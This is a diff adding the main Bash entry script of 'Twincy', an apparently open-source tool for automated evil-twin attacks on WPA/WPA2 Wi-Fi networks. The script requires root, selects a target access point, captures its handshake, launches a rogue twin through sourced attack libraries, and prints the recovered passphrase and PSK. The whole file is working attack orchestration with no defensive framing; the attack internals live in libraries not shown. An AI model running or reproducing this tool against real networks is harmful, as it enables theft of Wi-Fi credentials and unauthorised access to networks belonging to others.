@@ -1,0 +1,825 @@
+#!/usr/bin/env bash
+
+# Copyright 2022 Faither
+
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights to
+# use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
+# the Software, and to permit persons to whom the Software is furnished to do so,
+# subject to the following conditions:
+
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
+
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
+# FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
+# COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
+# IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
+# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+
+############################################################
+# Initials                                                 #
+############################################################
+
+#############
+# Constants #
+#############
+
+declare -r _Main_sourceFilepath="$( readlink -e -- "${BASH_SOURCE[0]:-$0}" 2> '/dev/null'; )"; # _Main_initFilepath
+declare -r _Main_sourceDirpath="$( dirname -- "$_Main_sourceFilepath" 2> '/dev/null'; )";
+
+[[ ! -f "$_Main_sourceFilepath" || ! -d "$_Main_sourceDirpath" ]] && exit 199;
+
+if [[ ! -d "$_Main_sourceDirpath" ]];
+then
+	printf $'No such initial directory found: \'\'' "$_Main_sourceDirpath";
+
+	exit 2;
+fi
+
+declare -r _Main_libDirpath="${_Main_sourceDirpath}/lib";
+
+declare -rA _Main_information=(
+	['title']='Twincy'
+	['version']='0.9'
+	['date']='2022'
+	['description']='Automated WPA/WPA2 twin attack'
+	['author']='Faither'
+)
+
+# TWINCY_THEME='white';
+declare -r _Main_ColorTheme="$TWINCY_THEME";
+
+# Initial environment variables
+
+declare -r _Main_EnvVar_IFS="$IFS";
+declare -r _Main_DumpFilepathDefault="${_Main_sourceDirpath}/.dump.log";
+declare -r _Main_TimeStart="$( date '+%s.%N'; )";
+
+#############
+# Variables #
+#############
+
+declare _Main_Dump="$_Main_DumpFilepathDefault";
+declare _Main_debugOptions='';
+declare _Main_deviceMain;
+declare _Main_deviceSecondary;
+declare _Main_apBssid;
+declare _Main_apChannel;
+declare _Main_apSsid;
+declare _Main_apPrivacy;
+declare _Main_apStationCount;
+declare _Main_handshakeFilepath;
+declare -A _Main_result=();
+
+############################################################
+# Libraries                                                #
+############################################################
+
+[[ "$_Lib_options" == '' ]] && source "${_Main_libDirpath}/options.sh";
+[[ "$_Lib_misc" == '' ]] && source "${_Main_libDirpath}/misc.sh";
+[[ "$_Lib_base" == '' ]] && source "${_Main_libDirpath}/base.sh";
+[[ "$_Lib_environment" == '' ]] && source "${_Main_libDirpath}/environment.sh";
+[[ "$_Lib_interfaces" == '' ]] && source "${_Main_libDirpath}/interfaces.sh";
+[[ "$_Lib_capture" == '' ]] && source "${_Main_libDirpath}/capture.sh";
+[[ "$_Lib_attacks" == '' ]] && source "${_Main_libDirpath}/attacks.sh";
+[[ "$_Lib_handshake" == '' ]] && source "${_Main_libDirpath}/handshake.sh";
+[[ "$_Lib_twin" == '' ]] && source "${_Main_libDirpath}/twin.sh";
+
+############################################################
+# Functions                                                #
+############################################################
+
+Main_Logo()
+{
+	declare color='{{@clLogo}}';
+
+	if [[ "$1" != '' ]];
+	then
+		declare color="{{$1}}";
+	fi
+
+	Misc_PrintF -p 2 -nmf "$color"'%s' -- \
+"\
+                ▄▄▄█████▓ █     █░ ██▓ ███▄    █  ▄████▄▓██   ██▓
+                ▓  ██▒ ▓▒▓█░ █ ░█░▓██▒ ██ ▀█   █ ▒██▀ ▀█ ▒██  ██▒
+                ▒ ▓██░ ▒░▒█░ █ ░█ ▒██▒▓██  ▀█ ██▒▒▓█    ▄ ▒██ ██░
+                ░ ▓██▓ ░ ░█░ █ ░█ ░██░▓██▒  ▐▌██▒▒▓▓▄ ▄██▒░ ▐██▓░
+                  ▒██▒ ░ ░░██▒██▓ ░██░▒██░   ▓██░▒ ▓███▀ ░░ ██▒▓░
+                  ▒ ░░   ░ ▓░▒ ▒  ░▓  ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░ ██▒▒▒ 
+                    ░      ▒ ░ ░   ▒ ░░ ░░   ░ ▒░  ░  ▒  ▓██ ░▒░ 
+                  ░        ░   ░   ▒ ░   ░   ░ ░ ░       ▒ ▒ ░░  
+                             ░     ░           ░ ░ ░     ░ ░     
+                                                 ░       ░ ░     
+";
+}
+
+Main_Debug()
+{
+	declare regex=$"(^${1}\$|^${1};|[^\\\\];${1};|[^\\\\];${1}\$)";
+
+	if [[ "$_Main_debugOptions" =~ $regex ]];
+	then
+		return 0;
+	fi
+
+	return 1;
+}
+
+Main_help()
+{
+	printf '\n\n';
+	Main_Logo;
+	printf '\n';
+	printf '%s\n' \
+		"  Title: ${_Main_information['title']}" \
+		"  Version: v${_Main_information['version']} (${_Main_information['date']})" \
+		"  Description: ${_Main_information['description']}" \
+		"  Author: ${_Main_information['author']}";
+
+	Misc_PrintF -nnp 1,1 -mf '{{@clDarkGray}}%s' -- "$( Misc_PrintF -r 80 -- '-'; )";
+
+	printf '%s\n' \
+		'  Properties:' \
+		'    -D - Main 802.11 device name (e.g. phy0)' \
+		'    -d - Secondary 802.11 device name (e.g. phy1)' \
+		'    -u - Non-root user' \
+		'    -b - Target BSSID (e.g. 00:11:22:33:44:55)' \
+		$'    -s - Target SSID (characters [,\'\\] are currently unsupported)' \
+		'    -c - Target channel' \
+		'    -H - Handshake filepath' \
+		'    -w - Web design name' \
+		'    -T - Temporary data dirpath' \
+		'    -L - Dump output log filepath' \
+		'    -v - Verbosity [0-5]' \
+		'' \
+		'  Flags:' \
+		'    -i - Ignore existing handshakes' \
+		'    -S - Clear session on exit' \
+		'    -l - List found 802.11 devices and exit' \
+		'    -h - Print help and exit {--help}';
+
+	Misc_PrintF -nnp 1,1 -mf '{{@clDarkGray}}%s' -- "$( Misc_PrintF -r 80 -- '-'; )";
+
+	printf '%s\n' \
+		'  Mandatory options for general usage: Ddu' \
+		'  Temporary data is inside session by default';
+
+	declare webDesignDirpaths=();
+	declare dirpath;
+
+	while read dirpath;
+	do
+		webDesignDirpaths+=( "$( basename -- "$dirpath" 2> '/dev/null'; )" );
+	done \
+	< <(
+		find "${Environment_resourcesWebDesignsDirpath}/" -mindepth 1 -maxdepth 1 -type d ! -name '-*' -print;
+	);
+
+	printf '  Found %s web designs: ' "${#webDesignDirpaths[@]}";
+	Misc_ArrayJoin -- "${webDesignDirpaths[@]}";
+	printf '\n\n';
+}
+
+Main_apTargetPrint()
+{
+	# "$(
+	# 	[[ "$_Main_apPrivacy" != '' ]] && printf '%s' " (${_Main_apPrivacy})" ||
+	# 		( [[ "$_Main_apBssid" != '' ]] && Misc_PrintF -s -1 -mf ' ({{@clGray}}-{{@clDefault}})' ); 
+	# )" \
+
+	Misc_PrintF -nmf $'  [ BSSID ] %s%s\n  [  SSID ] \'%s\'\n  [   CHA ] %s\n  [   STA ] %s\n' -- \
+		"$( [[ "$_Main_apBssid" != '' ]] && printf '%s' "$_Main_apBssid" || Misc_PrintF -mf '{{@clGray}}-{{@clDefault}}'; )" \
+		"$(
+			if [[ "$_Main_handshakeFilepath" != '' || "$_Main_apPrivacy" != '' ]];
+			then
+				printf " ${clLightGray}(";
+				[[ "$_Main_handshakeFilepath" != '' ]] && printf '%s' "$( basename -- "$_Main_handshakeFilepath" 2> '/dev/null'; )" || printf -- '-';
+				printf -- '; ';
+				[[ "$_Main_apPrivacy" != '' ]] && printf '%s' "$_Main_apPrivacy" || printf -- '-';
+				printf ")${clDefault}";
+			fi
+		)" \
+		"$_Main_apSsid" \
+		"$( [[ "$_Main_apChannel" != '' ]] && printf '%s' "$_Main_apChannel" || Misc_PrintF -mf '{{@clGray}}-{{@clDefault}}'; )" \
+		"$( [[ "$_Main_apStationCount" != '' ]] && printf '%s' "$_Main_apStationCount" || Misc_PrintF -mf '{{@clGray}}-{{@clDefault}}'; )";
+}
+
+Main_headerPrint()
+{
+	declare messageLeftRaw="$1";
+	declare messageRightRaw="$2";
+	declare messageLeft='';
+	declare messageRight='';
+	declare messageLeftFormatMetas=();
+	declare messageRightFormatMetas=();
+	declare length=80;
+	declare gap=2;
+
+	if [[ "$messageLeftRaw" != '' ]];
+	then
+		Misc_PrintF -o Main_headerPrint_messageLeft -mf "$messageLeftRaw";
+		declare messageLeft="$Main_headerPrint_messageLeft";
+	fi
+
+	if [[ "$messageRightRaw" != '' ]];
+	then
+		Misc_PrintF -o Main_headerPrint_messageRight -mf "$messageRightRaw";
+		declare messageRight="$Main_headerPrint_messageRight";
+	fi
+
+	# Messages without colors or general ANSI escapes
+	declare messageLeftWC="$( Misc_AnsiEscapeCodesRemove "$messageLeft" )";
+	declare messageRightWC="$( Misc_AnsiEscapeCodesRemove "$messageRight" )";
+
+	Misc_PrintF -np ,1 -mf '{{@clDarkGray}}%s' -- "$( Misc_PrintF -r "$length" -- '-'; )";
+
+	Misc_PrintF -np ",${gap}" \
+		-mf "%-$(( length / 2 + ( ${#messageLeft} - ${#messageLeftWC} ) ))s%$(( length / 2 + ( ${#messageRight} - ${#messageRightWC} ) - (gap * 2 - 2) ))s" -- \
+		"$messageLeft" "$messageRight";
+
+	Misc_PrintF -nnp ,1 -mf '{{@clDarkGray}}%s' -- "$( Misc_PrintF -r "$length" -- '-'; )";
+}
+
+############################################################
+# Methods                                                  #
+############################################################
+
+Main_apTargetSelect()
+{
+	###########
+	# Options #
+	###########
+
+	declare args;
+
+	if ! Options args \
+		'@2/[a-zA-Z][a-zA-Z0-9]*/' \
+		'?!-D;?!-d;?!-o' \
+		"$@";
+	then
+		Misc_PrintF -v 1 -t 'f' -nf $'[Main_apTargetSelect] Invalid options (code %s, index %s ~ \'%s\'): \'%s\'' -- \
+			"$_Options_ResultCode" "$_Options_FailIndex" "$_Options_ErrorMessage" "$( Misc_ArrayJoin -- "$@" )";
+
+		exit 200;
+	fi
+
+	declare __deviceMain="${args[0]}";
+	declare deviceSecondary="${args[1]}";
+	declare outputVariableReferenceName="${args[2]}";
+
+	# If the output reference matches the important variables.
+	# Both the reference and temp must mismatch or else the first would cause a reference loop and the second (temp) would return an empty result.
+	# Also, local variable names must mismatch with the referenced, or else reference may become local - empty result.
+	if [ "$outputVariableReferenceName" != '' ];
+	then
+		if [[ "$outputVariableReferenceName" == 'Main_apTargetSelect_outputVariableReference' ]];
+		then
+			Misc_PrintF -v 1 -t 'f' -nf $'[Main_apTargetSelect] Output variable reference interference: \'%s\'' -- "$( Misc_ArrayJoin -- "$@" )";
+
+			return 100;
+		fi
+
+		declare -n Main_apTargetSelect_outputVariableReference="$outputVariableReferenceName";
+		Main_apTargetSelect_outputVariableReference=();
+	fi
+
+	########
+	# Main #
+	########
+
+	declare apIndex='';
+	declare targetSelectCount=0;
+
+	while [[ ! "$apIndex" =~ ^(0|[1-9][0-9]*)$ ]];
+	do
+		if (( targetSelectCount > 0 ));
+		then
+			Misc_PrintF -nnp 1,1 -mf '{{@clDarkGray}}%s' -- "$( Misc_PrintF -r 80 -- '-'; )";
+		fi
+
+		Misc_PrintF -v 4 -t 'i' -nf $'Starting all channels capture%s' -- "$( (( targetSelectCount > 0 )) && printf ' (%s total)' "$targetSelectCount" )";
+		Misc_PrintF -v 4 -t 'n' -nf $'Waiting while capture is active';
+		declare Main_apTargetSelect_captureFilepath='';
+
+		if ! Capture_Start -Cd "$__deviceMain" -o Main_apTargetSelect_captureFilepath -x "$( Environment_WindowSector --hg 40 --vg 40 )";
+		then
+			Misc_PrintF -v 2 -t 'e' -p 1 -nf 'Failed to capture for target selection';
+
+			return 1;
+		fi
+
+		declare captureFilepathWithoutExtension="$Main_apTargetSelect_captureFilepath";
+		Environment_WindowArrange --bm 'main_twincy_terminal' -- $( Environment_WindowSector -t 0 -r 0 -b 0 -l 0 );
+		Misc_PrintF -v 4 -t 'n' -nf $'Processing capture data';
+		declare Main_apTargetSelect_apIndex;
+
+		if ! Capture_CsvApSelect -o Main_apTargetSelect_apIndex -f "${captureFilepathWithoutExtension}.csv" || (( Main_apTargetSelect_apIndex < 0 ));
+		then
+			Misc_PrintF -v 3 -t 'w' -nf 'No capture AP index selected';
+
+			return 1;
+		fi
+
+		declare apIndex="$Main_apTargetSelect_apIndex";
+		declare targetSelectCount="$(( targetSelectCount + 1 ))";
+	done
+
+	Misc_PrintF -v 4 -t 'n' -nnf $'Extracting access point data';
+	declare Main_apTargetSelect_apData;
+
+	if ! Capture_CsvApRead -o Main_apTargetSelect_apData -f "${captureFilepathWithoutExtension}.csv";
+	then
+		Misc_PrintF -v 2 -t 'e' -p 1 -nf $'Failed to process capture data';
+
+		return 2;
+	fi
+
+	Main_apTargetSelect_outputVariableReference=(
+		"${Main_apTargetSelect_apData[$apIndex]}" # BSSID
+		"${Main_apTargetSelect_apDataSsids[$apIndex]}"
+		"${Main_apTargetSelect_apDataChannels[$apIndex]}"
+		"${Main_apTargetSelect_apDataPrivacies[$apIndex]}"
+		"${Main_apTargetSelect_apDataStationCounts[$apIndex]}"
+	);
+
+	return 0;
+}
+
+Main_apTargetSelection()
+{
+	if [[ "$_Main_handshakeFilepath" != '' || "$_Main_apBssid" == '' && "$_Main_apSsid" == '' ]];
+	then
+		Misc_PrintF -cn;
+		Main_apTargetPrint;
+
+		Main_headerPrint \
+			'{{@clGray}}[{{@clDefault}} {{@clLightCyan}}1/4{{@clDefault}} {{@clGray}}]{{@clDefault}} Target selection' \
+			"${clLightGray}[${Environment_SessionId}]${clDefault}";
+	fi
+
+	# Try extracting target from a handshake if declared
+
+	if [[ "$_Main_handshakeFilepath" != '' ]];
+	then
+		Misc_PrintF -v 4 -t 'i'  -nmf $'Processing handshake';
+		declare handshakeFilepath="$( readlink -e -- "$_Main_handshakeFilepath" 2> '/dev/null'; )";
+
+		if ! Base_FsExists -t f -- "$handshakeFilepath";
+		then
+			Misc_PrintF -v 2 -t 'e' -nmf $'No such handshake file: \'%s\'' -- "$_Main_handshakeFilepath";
+			sleep 1;
+
+			return 2;
+		fi
+
+		_Main_handshakeFilepath="$handshakeFilepath";
+
+		# Copy the handshake capture to the temporary directory
+
+		declare handshakeFilename="$( basename -- "$_Main_handshakeFilepath" 2> '/dev/null'; )";
+		declare handshakeFilenameTemp="${Environment_TempDirpath}/${handshakeFilename}";
+
+		if
+			! Base_FsMove -cft 1 -- "$_Main_handshakeFilepath" "$handshakeFilenameTemp" ||
+			! Base_FsPerms -m 775 -- "$handshakeFilenameTemp";
+		then
+			Misc_PrintF -v 2 -t 'e' -nmf $'Could not read capture file (failed to prepare file): \'%s\' -> \'%s\'' -- "$_Main_handshakeFilepath" "$handshakeFilenameTemp";
+
+			return 4;
+		fi
+
+		# Select and filter the required AP
+
+		declare Main_apTargetSelection_captureSelectedAp;
+
+		if ! Capture_SelectAp -Fo Main_apTargetSelection_captureSelectedAp -f "$handshakeFilenameTemp";
+		then
+			Misc_PrintF -v 2 -t 'e'  -nmf $'Failed to select AP from handshake file: \'%s\'' -- "$handshakeFilenameTemp";
+
+			return 3;
+		fi
+
+		_Main_apBssid="$Main_apTargetSelection_captureSelectedAp";
+		_Main_apSsid="$Main_apTargetSelection_captureSelectedApSsid";
+		_Main_handshakeFilepath="$Main_apTargetSelection_captureSelectedApFilepath";
+
+		# Move the capture file to "captures"
+
+		# Create "captures" directory if doesn't exist
+
+		if ! Base_FsDirectoryCreate -p -- "$Capture_capturesDirpath";
+		then
+			Misc_PrintF -v 2 -t 'e' -nmf $'Failed to prepare initial handshake capture (workspace failed): \'%s\'' -- \
+				"$Capture_capturesDirpath";
+
+			return 5;
+		fi
+
+		# Move the filtered capture file from "temp" to session "captures"
+
+		if ! Base_FsMove -ft 1 -- "$_Main_handshakeFilepath" "${Capture_capturesDirpath}/";
+		then
+			Misc_PrintF -v 2 -t 'e' -nmf $'Failed to prepare initial handshake capture (failed to move file): \'%s\' -> \'%s\'' -- \
+				"$_Main_handshakeFilepath" \
+				"${Capture_capturesDirpath}/";
+
+			return 6;
+		fi
+
+		_Main_handshakeFilepath="${Capture_capturesDirpath}/$( basename -- "$_Main_handshakeFilepath" 2> '/dev/null'; )";
+	fi
+
+	# declare apPrivacy;
+	# declare apStationCount;
+
+	# If no BSSID and SSID declared
+	if [[ "$_Main_apBssid" == '' && "$_Main_apSsid" == '' ]];
+	then
+		# Misc_PrintF -c;
+		declare Main_apTargetSelection_apData;
+		
+		if ! Main_apTargetSelect -o Main_apTargetSelection_apData -D "$_Main_deviceMain" -d "$_Main_deviceSecondary";
+		then
+			return 1;
+		fi
+
+		_Main_apBssid="${Main_apTargetSelection_apData[0]}";
+		_Main_apSsid="${Main_apTargetSelection_apData[1]}";
+		_Main_apChannel="${Main_apTargetSelection_apData[2]}";
+		_Main_apPrivacy="${Main_apTargetSelection_apData[3]}";
+		_Main_apStationCount="${Main_apTargetSelection_apData[4]}";
+	fi
+
+	_Main_apBssid="${_Main_apBssid^^}"; # Capitalize BSSID
+
+	return 0;
+}
+
+Main_apTargetDetails()
+{
+	# If BSSID is known but SSID, or SSID is known but BSSID
+	if [[ "$_Main_apBssid" != '' && "$_Main_apSsid" == '' || "$_Main_apSsid" != '' && "$_Main_apBssid" == '' ]];
+	then
+		Misc_PrintF -cn;
+		Main_apTargetPrint;
+
+		Main_headerPrint \
+			'{{@clGray}}[{{@clDefault}} {{@clLightCyan}}2/4{{@clDefault}} {{@clGray}}]{{@clDefault}} Target details' \
+			"${clLightGray}[${Environment_SessionId}]${clDefault}";
+
+		Misc_PrintF -v 3 -t 'w' -nf $'No target %sSSID known for %s' -- "$( [[ "$_Main_apSsid" != '' ]] && printf 'B'; )" \
+			"$( [[ "$_Main_apSsid" != '' ]] && printf $'SSID \'%s\'' "$_Main_apSsid" || printf 'BSSID %s' "$_Main_apBssid"; )";
+
+		declare Main_apTargetDetails_apDetails;
+
+		if ! Capture_ApDetails -vo Main_apTargetDetails_apDetails -D "$_Main_deviceMain" -d "$_Main_deviceSecondary" -a "$_Main_apBssid" -s "$_Main_apSsid" -c "$_Main_apChannel";
+		then
+			Misc_PrintF -v 2 -t 'e' -nf $'Failed to obtain initial target %sSSID' "$( [[ "$_Main_apSsid" != '' ]] && printf 'B'; )";
+
+			return 1;
+		fi
+
+		# In case if obtained details, but some mismatch with initials
+		declare updatedApDetails=();
+
+		[[ "$_Main_apBssid" != '' && "$Main_apTargetDetails_apDetails" != "$_Main_apBssid" ]] && 
+			updatedApDetails+=( "$( printf $'B \'%s\' -> \'%s\'' "$_Main_apBssid" "$Main_apTargetDetails_apDetails" )" );
+
+		[[ "$_Main_apChannel" != '' && "$Main_apTargetDetails_apDetailsChannel" != "$_Main_apChannel" ]] && 
+			updatedApDetails+=( "$( printf $'C \'%s\' -> \'%s\'' "$_Main_apChannel" "$Main_apTargetDetails_apDetailsChannel" )" );
+
+		[[ "$_Main_apSsid" != '' && "$Main_apTargetDetails_apDetailsSsid" != "$_Main_apSsid" ]] && 
+			updatedApDetails+=( "$( printf $'S \'%s\' -> \'%s\'' "$_Main_apSsid" "$Main_apTargetDetails_apDetailsSsid" )" );
+
+		if [[ ${#updatedApDetails[@]} != 0 ]];
+		then
+			Misc_PrintF -v 3 -t 'w' -nf $'Obtained details mismatch with initials: \'%s\'' "${updatedApDetails[@]}";
+		fi
+
+		_Main_apBssid="$Main_apTargetDetails_apDetails";
+		_Main_apChannel="$Main_apTargetDetails_apDetailsChannel";
+		_Main_apSsid="$Main_apTargetDetails_apDetailsSsid";
+
+		if [[ "$Main_apTargetDetails_apDetailsHandshake" != '' ]];
+		then
+			Misc_PrintF -v 3 -t 'w' -nf $'Obtained handshake while gathering AP details%s: \'%s\'' \
+				"$( [[ "$_Main_handshakeFilepath" != '' ]] && printf ' (replaced initial)' )" "$Main_apTargetDetails_apDetailsHandshake";
+
+			sleep 1;
+
+			_Main_handshakeFilepath="$Main_apTargetDetails_apDetailsHandshake";
+		fi
+	fi
+
+	if printf '%s' "$_Main_apSsid" | grep -q $',\|\'\|\\\\';
+	then
+		Misc_PrintF -v 2 -t 'e' -nf $'Characters [comma, \', \\\\] are currently unsupported in SSID to capture: \'%s\'' -- "$_Main_apSsid";
+
+		return 1;
+	fi
+
+	return 0;
+}
+
+Main_handshake()
+{
+	declare ignoreExistingHandshakes="$1";
+	shift;
+
+	# If no handshake file declared or no such exists nor does it fit the requirements
+	if
+		[[ "$_Main_handshakeFilepath" == '' ]] || ! Base_FsExists -t 1 -- "$_Main_handshakeFilepath" ||
+		! Handshake_Verify -fc "$_Main_handshakeFilepath" -b "$_Main_apBssid" -s "$_Main_apSsid";
+	then
+		Misc_PrintF -cn;
+		Main_apTargetPrint;
+
+		Main_headerPrint \
+			'{{@clGray}}[{{@clDefault}} {{@clLightCyan}}3/4{{@clDefault}} {{@clGray}}]{{@clDefault}} Handshake' \
+			"${clLightGray}[${Environment_SessionId}]${clDefault}";
+
+		declare Main_handshake_handshakeFoundFilepath;
+
+		# If do not ignore existing handshakes and such handshake already exists (and user has selected one)
+		if [[ "$ignoreExistingHandshakes" == 0 ]] && Handshake_Exists -o Main_handshake_handshakeFoundFilepath -a "$_Main_apBssid" -s "$_Main_apSsid";
+		then
+			_Main_handshakeFilepath="$Main_handshake_handshakeFoundFilepath";
+		else
+			Misc_PrintF -v 2 -t 'i' -nf $'Starting initial handshake capture';
+			declare Main_handshake_targetHandshake;
+
+			if ! Handshake_Capture -vfo Main_handshake_targetHandshake -D "$_Main_deviceMain" -d "$_Main_deviceSecondary" -a "$_Main_apBssid" -c "$_Main_apChannel" -s "$_Main_apSsid";
+			then
+				Misc_PrintF -v 2 -t 'e' -nf $'Failed to obtain initial handshake';
+
+				return 1;
+			fi
+
+			_Main_handshakeFilepath="$Main_handshake_targetHandshake";
+			_Main_apBssid="$Main_handshake_targetHandshakeBssid";
+
+			if [[ "$Main_handshake_targetHandshakeSsid" != '' ]];
+			then
+				if [[ "$_Main_apSsid" != '' && "$Main_handshake_targetHandshakeSsid" != "$_Main_apSsid" ]];
+				then
+					Misc_PrintF -v 3 -t 'w' -nf $'Initial SSID and initial handshake SSID mismatch. Using handshake.';
+				fi
+
+				_Main_apSsid="$Main_handshake_targetHandshakeSsid";
+			fi
+		fi
+	fi
+
+	return 0;
+}
+
+Main_twin()
+{
+	Misc_PrintF -cn;
+	Main_apTargetPrint;
+
+	Main_headerPrint \
+		'{{@clGray}}[{{@clDefault}} {{@clLightCyan}}4/4{{@clDefault}} {{@clGray}}]{{@clDefault}} Twin' "${clLightGray}[${Environment_SessionId}]${clDefault}";
+
+	declare Main_twin_results;
+
+	if
+		! Twin_Start -vo Main_twin_results -D "$_Main_deviceMain" -d "$_Main_deviceSecondary" \
+			-a "$_Main_apBssid" -c "$_Main_apChannel" -s "$_Main_apSsid" -h "$_Main_handshakeFilepath";
+	then
+		Misc_PrintF -v 2 -t 'e' -nf $'Twin attack failed';
+
+		return 1;
+	fi
+
+	_Main_result['passphrase']="$Main_twin_results";
+	_Main_result['bssid']="$Main_twin_resultsBssid";
+	_Main_result['ssid']="$Main_twin_resultsSsid";
+	_Main_result['handshake_filepath']="$Main_twin_resultsHandshakeFilepath";
+	_Main_result['psk']="$Main_twin_resultsPsk";
+	_Main_result['filepath']="$Main_twin_resultsFilepath";
+
+	return 0;
+}
+
+############################################################
+# Main                                                     #
+############################################################
+
+Main()
+{
+	###########
+	# Options #
+	###########
+
+	declare args;
+
+	if ! Options args \
+		'?-T;?-H;?-D;?-d;?-b;?-c;?-s;?-u;?-w;?-v;?-L;?--debug;-i;-S;-l;-h:--help' \
+		"$@";
+	then
+		Misc_PrintF -v 1 -t 'f' -nf $'[Main] Invalid options (code %s, index %s ~ \'%s\'): \'%s\'' -- \
+			"$_Options_ResultCode" "$_Options_FailIndex" "$_Options_ErrorMessage" "$( Misc_ArrayJoin -- "$@" )";
+
+		exit 200;
+	fi
+
+	declare __tempDirpath="${args[0]}";
+	declare __handshakeFilepath="${args[1]}";
+	declare __deviceMain="${args[2]}";
+	declare __deviceSecondary="${args[3]}";
+	declare __apBssid="${args[4]}";
+	declare __apChannel="${args[5]}";
+	declare __apSsid="${args[6]}";
+	declare __userNonRoot="${args[7]}";
+	declare __webDesign="${args[8]}";
+	declare __verbosity="${args[9]}";
+	declare __dumpFilepath="${args[10]}";
+	declare __debug="${args[11]}";
+	declare __ignoreExistingHandshakes="${args[12]}";
+	declare __clearSession="${args[13]}";
+	declare __listDevices="${args[14]}";
+	declare __helpPrint="${args[15]}";
+
+	########
+	# Main #
+	########
+
+	_Main_deviceMain="$__deviceMain";
+	_Main_deviceSecondary="$__deviceSecondary";
+	_Main_apBssid="$__apBssid";
+	_Main_apChannel="$__apChannel";
+	_Main_apSsid="$__apSsid";
+	_Main_handshakeFilepath="$__handshakeFilepath";
+	_Main_debugOptions="$__debug";
+
+	if Main_Debug 'color';
+	then
+		Misc_ColorThemePrint;
+
+		exit 0;
+	fi
+
+	if [[ "$__dumpFilepath" != '' ]];
+	then
+		_Main_Dump="$( readlink -f -- "$__dumpFilepath" 2> '/dev/null'; )";
+	fi
+
+	if [[ "$__verbosity" != '' ]];
+	then
+		Misc_VerbosityLevel="$__verbosity";
+	fi
+
+	if [[ "$__tempDirpath" != '' ]];
+	then
+		Environment_TempDirpath="$__tempDirpath";
+	fi
+
+	if [[ "$__userNonRoot" != '' ]];
+	then
+		Environment_UserNonRoot="$__userNonRoot";
+	fi
+
+	if [[ "$__webDesign" != '' ]];
+	then
+		Environment_WebDesign="$__webDesign";
+	fi
+
+	Environment_ClearSession="$__clearSession";
+
+	#---
+	# Start
+	#---
+
+	if [[ "$__helpPrint" != 0 ]];
+	then
+		_Main_Dump='/dev/null'; # In case the dump file is not writable by non-root user
+		Main_help;
+
+		exit 0;
+	fi
+
+	# If the current UID is not "root"
+	if [[ "$UID" != 0 ]];
+	then
+		_Main_Dump='/dev/null';
+		Misc_PrintF -v 1 -t 'e' -p 1 -nnmf '{{@clRed}}root{{@clDefault}} is required';
+
+		exit 1;
+	fi
+
+	# If requested to list the interfaces
+	if [ "$__listDevices" != 0 ];
+	then
+		printf '\n';
+		Interface_List;
+		printf '\n';
+
+		return 0;
+	fi
+
+	if [[ "$_Main_deviceMain" == '' ]];
+	then
+		_Main_Dump='/dev/null';
+		Misc_PrintF -v 1 -t 'e' -p 1 -nnmf 'No main 802.11 device is specified';
+
+		exit 1;
+	fi
+
+	if [[ "$_Main_deviceSecondary" == '' ]];
+	then
+		_Main_Dump='/dev/null';
+		Misc_PrintF -v 1 -t 'e' -p 1 -nnmf 'No secondary 802.11 device is specified';
+
+		exit 1;
+	fi
+
+	if [[ "$__userNonRoot" == '' ]];
+	then
+		_Main_Dump='/dev/null';
+		Misc_PrintF -v 1 -t 'e' -p 1 -nnmf 'No non-root user is specified';
+
+		exit 1;
+	fi
+
+	#---
+	# Session start
+	#---
+
+	printf '%s\n' \
+		$'\n'"--------------------------------------------------------------------------------" \
+		" Session start $( printf $'\'%s\' (%s)' "$Environment_SessionId" "$( date -u; )"; )" \
+		" Location: '$( printf '%s' "$Environment_SessionDirpath"; )'" \
+		"--------------------------------------------------------------------------------"$'\n' &>> "$_Main_Dump";
+
+	Misc_PrintF -cnn;
+	Main_Logo;
+	Main_headerPrint 'Workspace' "${clLightGray}[${Environment_SessionId}]${clDefault}";
+
+	if ! Environment_Prepare -D "$_Main_deviceMain" -d "$_Main_deviceSecondary";
+	then
+		return 1;
+	fi
+
+	#
+	# Target AP selection (1/4)
+	#
+
+	if ! Main_apTargetSelection;
+	then
+		return 1;
+	fi
+
+	#
+	# BSSID or SSID capture (2/4)
+	#
+
+	if ! Main_apTargetDetails;
+	then
+		return 1;
+	fi
+
+	#
+	# Handshake (3/4)
+	#
+
+	if ! Main_handshake "$__ignoreExistingHandshakes";
+	then
+		return 1;
+	fi
+
+	#
+	# "Evil Twin" attack (4/4)
+	#
+
+	if ! Main_twin;
+	then
+		return 1;
+	fi
+
+	#
+	# "Ending
+	#
+
+	Misc_PrintF -cp 2;
+	Environment_WindowArrange --bm 'main_twincy_terminal' -- $( Environment_WindowSector -H 6 -V 6 -h 1-4 -v 1-4 -t 0 -r 0 -b 0 -l 0 );
+	Main_Logo;
+	Misc_PrintF -nnp ,1 -mf '{{@clDarkGray}}%s' -- "$( Misc_PrintF -r 80 -- '-'; )";
+	Misc_PrintF -p ,2 -nmf $'Passphrase: \'{{@clLightGreen}}%s{{@clDefault}}\' (%s)' -- "${_Main_result['passphrase']}" "${#_Main_result['passphrase']}";
+	Misc_PrintF -p ,2 -nmf $'SSID: \'%s\'' -- "${_Main_result['ssid']}";
+	Misc_PrintF -p ,2 -nmf $'PSK: {{@clLightGreen}}%s{{@clDefault}}' -- "${_Main_result['psk']}";
+	Misc_PrintF -p ,2 -nmf $'BSSID: %s' -- "${_Main_result['bssid']}";
+	Misc_PrintF -p ,2 -nmf $'Handshake: \'%s\'' -- "$( basename -- "${_Main_result['handshake_filepath']}" 2> '/dev/null'; )";
+	Misc_PrintF -p ,2 -nmf $'PSK stored: \'%s\'' -- "$( basename -- "${_Main_result['filepath']}" 2> '/dev/null'; )";
+
+	return 0;
+}
+
+############################################################
+# Bootloader                                               #
+############################################################
+
+Main "$@";
